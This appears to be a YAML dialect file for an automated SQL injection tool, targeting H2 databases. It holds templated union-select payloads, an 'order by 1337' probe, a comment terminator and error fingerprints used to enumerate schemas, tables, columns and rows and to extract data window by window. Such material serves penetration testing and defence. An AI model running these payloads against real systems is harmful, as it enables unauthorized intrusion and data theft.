vendor: H2
# jdbc:h2:tcp://127.0.0.1/mem:public;IGNORECASE=TRUE;DB_CLOSE_ON_EXIT=FALSE;DB_CLOSE_DELAY=-1;
# sa

resource:
 info: |
  concat(
      concat_ws(
          '${enclose_value_sql}',
          h2version(),
          database(),
          user()
      ),
      '${trail_sql}'
  )

 schema:
  database: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || cast(q as char)
           || '${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select
           cast(schema_name as char) r,
           count(TABLE_NAME) q
       from INFORMATION_SCHEMA.tables t
       right join INFORMATION_SCHEMA.schemata s
       on t.table_schema = s.schema_name
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || cast(r as char)
           || '${separator_qte_sql}0${enclose_value_sql}'
           order by r
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select TABLE_NAME r
       from information_schema.tables
       where TABLE_SCHEMA = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || cast(n as char)
           || '${separator_qte_sql}0${enclose_value_sql}'
           order by n
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select COLUMN_NAME n
       from information_schema.columns
       where TABLE_SCHEMA = '${database}'
       and TABLE_NAME = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || cast(q as char)
            || '${enclose_value_sql}'
            order by r
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) from (
        select
            cast(${fields} as char) r,
            count(*) q
        from `${database}`.`${table}`
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           /**
            * If reach end of string (concat(${lead}+NULL)) then concat nullifies the result
            */
           concat(
               '${lead}',
               substr(
                   (${injection}),
                   ${window.char},
                   /**
                    * Minus '${lead}' should apply
                    */
                   ${capacity}
               )
           )
   )
  limit: limit ${limit.value}, 65536
  failsafe: "'' || 1337${indice}7330%2b1"
  calibrator: repeat('${calibrator_sql}', 65536)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    - h2 database
   orderByErrorMessage:
    - Order by expression "1337" must be in the result list in this case

 normal:
  indices: union select ${indices}
  capacity: |
   (
       select
           concat(
               '${lead}',
               ${indice},
               ${calibrator}
           )
   )
  orderBy: order by 1337